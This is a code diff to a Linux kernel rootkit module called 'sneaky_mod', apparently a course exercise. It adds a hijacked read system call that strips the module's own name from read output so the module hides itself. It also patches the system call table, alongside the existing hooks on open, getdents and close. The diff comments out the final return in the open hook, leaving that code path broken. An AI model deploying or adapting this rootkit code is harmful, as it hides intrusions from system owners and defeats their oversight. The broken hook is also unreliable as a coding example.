@@ -55,7 +55,8 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, 
 //new system call
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
-//asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
+asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
+
 asmlinkage int (*original_close)(int fd);
 
 
@@ -77,9 +78,8 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode) {
 			return original_call(pathname, flags, mode);
 		}
 	}
-	
-	printk(KERN_INFO "Very, very Sneaky!\n");
-	return original_call(pathname, flags, mode);
+	//printk(KERN_INFO "Very, very Sneaky!\n");
+	//return original_call(pathname, flags, mode);
 }
 
 asmlinkage int sneaky_sys_close(int fd){
@@ -109,6 +109,25 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 	return ret;
 }
 
+asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) {
+	ssize_t ret = original_read(fd, buf, count);
+	int size = 0;
+	if(file_d >= 0 && file_d == fd) {
+		char * begin = strstr(buf, "sneaky_mod");
+		if(begin != NULL) {
+			char * next = begin;
+			while((*next) != '\n') {
+				next++;
+			}
+			size = next + 1 - begin;
+			memmove(begin, next + 1, (ret - ((next + 1) - (char *)buf)));
+		}
+		return ( ret = ret - size);
+	}
+	return ret;
+}
+
+
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void) 
 {
@@ -134,6 +153,8 @@ static int initialize_sneaky_module(void)
 	original_getdents = (void*)*(sys_call_table + __NR_getdents);
 	*(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
+	original_read = (void*)*(sys_call_table + __NR_read);
+	*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
 	original_close = (void*)*(sys_call_table + __NR_close);
 	*(sys_call_table + __NR_close) = (unsigned long)sneaky_sys_close;
@@ -165,8 +186,9 @@ static void exit_sneaky_module(void)
 	//function address. Will look like malicious code was never there!
 	*(sys_call_table + __NR_open) = (unsigned long)original_call;
 	*(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
-	//*(sys_call_table + __NR_read) = (unsigned long)original_read;
+	*(sys_call_table + __NR_read) = (unsigned long)original_read;
 	*(sys_call_table + __NR_close) = (unsigned long)original_close;
+	
 	//Revert page to read-only
 	pages_ro(page_ptr, 1);
 	//Turn write protection mode back on
